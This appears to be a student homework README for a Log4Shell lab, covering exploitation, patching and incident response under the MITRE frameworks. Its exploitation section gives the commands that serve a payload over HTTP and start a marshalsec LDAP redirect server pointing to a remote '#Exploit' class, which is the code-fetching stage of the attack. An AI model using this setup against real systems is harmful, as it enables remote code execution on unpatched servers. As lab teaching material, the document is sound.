# Week9: Log4Shell Vulnerability Homework

Introduction: This project demonstrates the exploitation and mitigation of the Log4Shell vulnerability (CVE-2021-44228) using a vulnerable Java Spring Boot application deployed via Docker Compose. The objectives of this homework are:

- Simulate a real-world Log4Shell exploit scenario
- Apply MITRE ATT&CK, DEFEND, and REACT frameworks
- Harden and redeploy the application using secure coding practices

---

## Prerequisites
- Docker & Docker Compose
- Java + Maven (if building manually)
- Python 3 (for attacker LDAP simulation)
Also, Ports 8080 and 389 are open in your EC2 Security Group (for the app and LDAP server).

---

## Part 1: Exploitation (MITRE ATT&CK)
After launching the ldap app "python3 ldap_server.py"  i received this error: ldap3.core.exceptions.LDAPSocketOpenError: socket connection error while opening: [Errno 111] Connection refused; after researching this error, i came to the point of using marshalsec, which is a malicious LDAP redirect server, not a real LDAP directory; i cloned it (git clone https://github.com/mbechler/marshalsec.git) then built it. I then ran manually these commands 
# HTTP server (for payload)
cd exploit/
python3 -m http.server 8000

# LDAP redirect server
java -cp marshalsec-*.jar marshalsec.jndi.LDAPRefServer http://<your-ip>:8000/#Exploit



## Part 2: Defense (MITRE DEFEND)
- Log4j upgraded to 2.17.0.
- Input validation implemented to block JNDI patterns.

## Part 3: Response (MITRE REACT)
- Detect: Logs examined for exploit traces
- Contain: Vulnerable container stopped
- Eradicate: Patched container deployed
- Recover: System restored with mitigation verified

---

## Conclusion and Lessons Learned

- Logging libraries must be treated as part of the attack surface.
- Validate all input even when passed to internal services.
- MITRE frameworks provide a clear guide for security lifecycle management.

---

## References

- [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
- [MITRE ATT&CK](https://attack.mitre.org/)
- [MITRE DEFEND](https://defend.mitre.org/)
- [MITRE REACT](https://www.mitre.org/publications/technical-papers/react-a-framework-for-incidence-response)

